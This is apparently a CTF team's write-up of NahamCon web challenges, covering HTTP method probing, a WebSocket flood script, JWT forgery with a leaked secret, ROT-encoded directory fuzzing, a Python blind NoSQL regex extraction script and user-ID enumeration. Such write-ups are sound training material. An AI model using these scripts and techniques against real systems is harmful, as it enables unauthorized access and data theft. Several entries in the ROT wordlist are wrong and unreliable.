# web

## Method in the Madness
> Solved by thewhiteh4t

Six checkboxes are displayed, when we click on `/interesting` one checkbox is ticked. Goal was to tick all checkbox and hope for it to reveal the flag.

Hint is in the name of the challenge : Method → HTTP Methods

So we just have to try different methods on `/interesting`


    curl http://challenge.nahamcon.com:31661/interesting
    curl -X POST http://challenge.nahamcon.com:31661/interesting
    curl -X PUT http://challenge.nahamcon.com:31661/interesting
    curl -X PATCH http://challenge.nahamcon.com:31661/interesting
    curl -X DELETE http://challenge.nahamcon.com:31661/interesting
    curl -X OPTIONS http://challenge.nahamcon.com:31661/interesting

After running all curl command, flag appears!


![](https://i.imgur.com/AtuE3fG.png)


**Key Learning and Takeaways**


- Beyond Just GET and POST : We all know GET and POST methods, but there are more HTTP methods such as :
    - PUT (for creating or updating resources)
    - PATCH (for partial updates)
    - DELETE (for removing resources)
    - OPTIONS (for asking the server what methods it supports)
- This challenge was a perfect example of how foundational web knowledge combined with simple tools can show new things while testing.


----------


## TMCB
> Solved by Legend

In this challenge there are two million checkboxes that we need to check to get the flag.

![](https://i.imgur.com/BuowCay.png)


The website is using web socket's to send the checked boxes and update it on server. I tired bash script to send 300000 at a time in burp but at around 1700000 the connection got reset, so I had to make a script.

I tried using JavaScript to send the checked boxes in batch and it worked.


    const ws = new WebSocket('ws://' + location.host + '/ws');
    ws.onopen = () => {
        let i = 0;
        function send() {
            if (i >= 2000000) return;
            let numbers = [];
            for (let j = 0; j < 200000; j++) {
                numbers.push(i + j);
            }
            ws.send(JSON.stringify({ action: 'check', numbers: numbers }));
            i += 200000;
            setTimeout(send, 250);
        }
        send();
    };

Accidentally sent way more than required, but it worked.

![](https://i.imgur.com/DGjYRvj.png)


**Key Learning and Takeaways**

- Web sockets are different from HTTP; learning how they work is useful for web challenges.
- Sending too much data at once can crash the connection; break it into smaller parts and add a delay.
- You don't need to fully know a programming language to write useful scripts experimenting helps.
- Automating tasks with code is often more effective than using manual tools like Burp.
- Code doesn’t need to be perfect, if it works, it works.


----------

## SNAD
> Solved by Legend

In this challenge the website is having interaction if we click the website *sand* particles will fall off.
I check the source code and found the code for this where specific points were mentioned which we needed to trigger.

Tried a bunch of things and also tried to access the flag using `checkFlag()` but it didn't work so again made a script which will inject the points where the code is looking for.


    const targets = [
      { x: 367, y: 238, hue: 0 },
      { x: 412, y: 293, hue: 40 },
      { x: 291, y: 314, hue: 60 },
      { x: 392, y: 362, hue: 120 },
      { x: 454, y: 319, hue: 240 },
      { x: 349, y: 252, hue: 280 },
      { x: 433, y: 301, hue: 320 }
    ];
    
    for (let i = 0; i < targets.length; i++) {
      injectSand(targets[i].x, targets[i].y, targets[i].hue);
    }

Once the points are matched to where the code is expecting the checks are passed and flag is given.

![](https://i.imgur.com/KLnhP7m.png)


**Key Learning and Takeaways**

- Always check the source code it often includes useful logic or hardcoded values.
- Interactive web challenges may hide important behavior in JavaScript; inspect scripts, not just HTML.
- Reverse-engineering how the frontend works can help you figure out how to trigger backend logic.

----------

## Infinite Queue
> Solved by Legend

In this challenge there is a website in which we need to buy a ticket, but we are added to a long queue.


![](https://i.imgur.com/sf9G3EA.png)


There was a JWT token to us which contains the info for our ticket.


![](https://i.imgur.com/BQEzHAg.png)


So I modified the value for `queue_time` but got an error because the token's signature was failing, but the server responded with too much information including the `queue_time`. 

![](https://i.imgur.com/pjWycz6.png)


I used the `JWT_SECRET` to sign the token which I modified and got in to purchase the ticket.

![](https://i.imgur.com/q4m9Sz2.png)


Once the purchase is done we can get the flag from the API request of the ticket PDF.


![](https://i.imgur.com/D5GR7Mr.png)


**Key Learning and Takeaways**

- Don’t trust JWTs blindly they can be modified if the secret is known or weak.
- Error messages can leak useful information always read them carefully.
- JWT signing is a common web security flaw when secrets are exposed or guessable.


----------


## My First CTF
> Solved by thewhiteh4t

Hint was ROT cipher, if we try to access `/flag.txt` it prints a message : `Ha, you wish!`. So the idea here was that we can use ROT cipher one `flag.txt` and one of the variants should work. To generate the wordlist of each variant I used chatgpt : 


    ROT01: gmbh.uyu
    ROT02: hnci.vzv
    ROT03: iodj.waw
    ROT04: jpek.xbx
    ROT05: kqfl.ycy
    ROT06: lrgm.zdz
    ROT07: mshn.aea
    ROT08: ntio.bfb
    ROT09: oujp.cgc
    ROT10: pvkq.dhd
    ROT11: qwlr.eie
    ROT12: rxms.fjf
    ROT13: synt.gkg
    ROT14: tzou.hlhl
    ROT15: uapv.imim
    ROT16: vbqw.jnjn
    ROT17: wcrx.koko
    ROT18: xdsy.lplp
    ROT19: yetz.mqmq
    ROT20: zfua.nrnr
    ROT21: agvb.osos
    ROT22: bhwc.ptpt
    ROT23: cixd.ququ
    ROT24: djye.rvrv
    ROT25: ekzf.swsw

Then I used the list with [FinalRecon](https://github.com/thewhiteh4t/FinalRecon), alternatively you can use tools like `gobuster` or `ffuf`, below you can see the flag file is named as `gmbh.uyu`. Accessing the page prints the flag.


![](https://i.imgur.com/AcL7Ifw.png)


**Key Learning and Takeaways**


- The Hint : The hint which was the image in this case suggested us to think laterally : what if the filename itself is ROT-encoded?
- ROT Ciphers : ROT ciphers (like ROT13) are super basic, they just shift letters around. This challenge showed how a fundamental cipher, when applied in an unexpected place (like the filename), can totally throw you off.
- ChatGPT for Wordlists : Instead of manually generating all 25 ROT variations of "flag.txt," using ChatGPT to quickly spit out that wordlist was an efficient shortcut. It's a great example of how AI can help automate tedious tasks in CTFs.


----------


## My Second CTF
> Solved by thewhiteh4t

Similar to first variant of this challenge, we need to again use ROT cipher but differently. First I tried to use the previous wordlist, but that did not return anything. Then I figured out that this time we were supposed to perform directory enumeration as a wordlist was provided for this one. For ROTting each word I wrote a python script : 


    #!/usr/bin/env python3
    
    import sys
    
    rot_count = int(sys.argv[1])
    
    
    def rot(word):
        result = ''
        for char in word:
            if char.isalpha():
                base = ord('a') if char.islower() else ord('A')
                result += chr((ord(char) - base + rot_count) % 26 + base)
            else:
                result += char
        return result
    
    
    with open('wordlist.txt') as f:
        for line in f:
            word = line.strip()
            print(rot(word))

Yes the script can be improved in many ways, but again this is not a coding competition…


![](https://i.imgur.com/inJEJP1.png)


After that I performed directory enumeration using [FinalRecon](https://github.com/thewhiteh4t/FinalRecon), alternatively you can use `gobuster` or `ffuf` to achieve same results : 


![](https://i.imgur.com/VGn3p63.png)


Now here it took an interesting turn as this was an API endpoint and a correct parameter was required


![](https://i.imgur.com/dw8wZrp.png)


For this task I used [ffuf](https://github.com/ffuf/ffuf) to fuzz the parameter with the wordlist I created in previous stage : 


![](https://i.imgur.com/6cNin1z.png)


And got a hit! Below you can see that size is different for one request, which suggests a change :


![](https://i.imgur.com/apdgt8f.png)



![](https://i.imgur.com/Dt23ZQu.png)


**Key Learning and Takeaways**


- Scripting : This was the perfect scenario to whip up a quick Python script. It doesn't need to be pretty or perfect, but it needs to work and automate the work. 
- Directory Enumeration is Key : Once we had our ROT encoded directory wordlist, it was time for some serious brute forcing. Tools like FinalRecon (or gobuster/ffuf) are indispensable here.
- The API Twist : Finding a ROTted directory wasn't enough, it turned out to be an API endpoint. This immediately tells you that you need to send parameters. When status codes are same then we need to inspect a change in the response size.

----------

## My Third CTF
> Solved by thewhiteh4t

Similar to second variant of this challenge, we again had to perform directory enumeration but this time it was nested. That means nested directories. I used the same wordlist I created in second variant, so I will skip that part, if you are looking for that please read the writeup for second variant.


![](https://i.imgur.com/jYbH1Iy.png)


Got first hit, but we get 403 on this, I could not find anything after poking around so I finally tried to enumerate nested directories in the one I found and got another hit!


![](https://i.imgur.com/7yYPqtg.png)


After several iterations of the same process I finally landed on the flag directory! 


![](https://i.imgur.com/O6KpGaR.png)


**Key Learning and Takeaways**


- Thinking beyond 403 : After poking around a bit and realizing the challenge was likely nested was the key. So, instead of giving up on the 403 directory, we started enumerating inside it!
- Try Harder : Sometimes, the solution isn't immediate, and you just have to keep digging, keep iterating, and trust your instinct and tools to eventually find that hidden gem. Overtime with experience both your instinct and tooling will improve.

----------

## NoSequel
> Solved by thewhiteh4t

In this challenge we had to extract the flag from a movie DB using MongoDB and a search function, as the name suggests first thought was NoSQL injections, but that was not needed as you will see.

An example search query was given : 


    title: Inception {"year": {"$gt": 1990}} title: {$regex: "The"}

Two collections were available in the dropdown and our flag is in `Flags` collection, because it's a CTF. We can figure out correct query string for Flags collection using the errors and eventually build a working query :  


    Query: a
    Error: Only regex queries are supported on the flag collection
    
    Query: {$regex: "The"}
    Error: Only regex on 'flag' field is supported
    
    Query: flag: {$regex: "The"}
    Result:  No results found matching your search criteria.
    
    Query: flag: {$regex: "flag"}
    Result: Pattern matched
    
    Query: flag: {$regex: "flag{"}
    Result: Pattern matched
    
    Query: flag: {$regex: "flag["}
    Result: No results found matching your search criteria.

So by abusing the regex filter we can extract the flag character by character, to automate the process I wrote a python script, the script will bruteforce each character and when it gets expected response, it will update the flag variable and continue with the next character and so on until it extracts all 32 characters of the flag


    #!/usr/bin/env python3
    
    import string
    import requests
    
    url = 'http://challenge.nahamcon.com:31735/search'
    flag = 'flag{'
    charset = []
    charset.extend(list(string.digits))
    charset.extend(list(string.ascii_lowercase))
    
    while len(flag) != 37:
            for char in charset:
                    payload = {
                            'query': 'flag: {$regex: "^' + flag + char + '"}',
                            'collection': 'flags'
                    }
    
                    rqst = requests.post(url, data=payload)
                    output = rqst.text
    
                    if 'Pattern matched' in output:
                            flag += char
                            print(flag)
    
    print(flag + '}')

As you can see the script generates brute force art with the flag at the end : 


![](https://i.imgur.com/HQrZmZU.png)


**Key Learning and Takeaways**


- Error Messages are Your Friend : When trying to figure out the right query for the "Flags" collection, the server's error messages were gold. They guided us, bit by bit, to understand the exact syntax and structure it expected.
- The Power of Regex : The search function supported regular expressions, and that's where the magic happened. Instead of trying to guess the whole flag at once, we could use regex to ask the database, Does the flag start with 'a' ? How about 'b' ? Does the next character match 'c' ?
- Automation : This challenge screamed for a script. Our Python script systematically found each character, confirming it, and then moving to the next, saving lot of time.


----------


## Advanced Screening
> Solved by thewhiteh4t

We are welcomed with an employee screening form in this challenge. We had to enter an employee email to proceed, so for testing I simply sent a random email to check for response, the page itself doesn’t show any useful error response but the response of API call in browser network inspect tool shows an error message, and it leaks the valid domain the API will accept :  


![](https://i.imgur.com/7DrVRr5.png)


After adding the correct domain, the service asks for an OTP. At this point I decided to look into any available javascripts present on the page : 


    <script src="/assets/js/app.js"></script>

This script exposes few more endpoints which we can use to our advantage : 


    const tokenResponse = await fetch('/api/screen-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: data.user_id })
    });
    // and
    window.location.href = `/screen/?key=${tokenData.hash}`;

So we can see that `user_id` is being sent to `/api/screen-token`, this suggested that we can query it with different user IDs and see if something juicy shows, and it did on `user_id : 7` and below you can see it responded with a hash value and above you can see the script sends a hash in `key` parameter : 


![](https://i.imgur.com/bzT0hpP.png)


Sending the hash in the `key` parameter prints the flag!


![](https://i.imgur.com/NnfjShy.png)


**Key Learning and Takeaways**


- Always check requests : That's where we found the hidden error message leaking the valid domain the API would accept. Alternatively you can always use `burpsuite` which will intercept and show all these requests by default.
- JavaScript Often Hides Secrets : JavaScript files frequently expose hidden API endpoints, internal logic, and parameters that aren't immediately obvious from just looking at the page.
- API Endpoint Enumeration : Peeking into `app.js` revealed `/api/screen-token` and, crucially, that it expected a `user_id`. When we hit `user_id: 7`, it gave us a hash value. This is a classic pattern, when you find an API endpoint that takes an ID, try enumerating common IDs (like 1, 2, 3... or common ranges) to see what secrets it might expose.

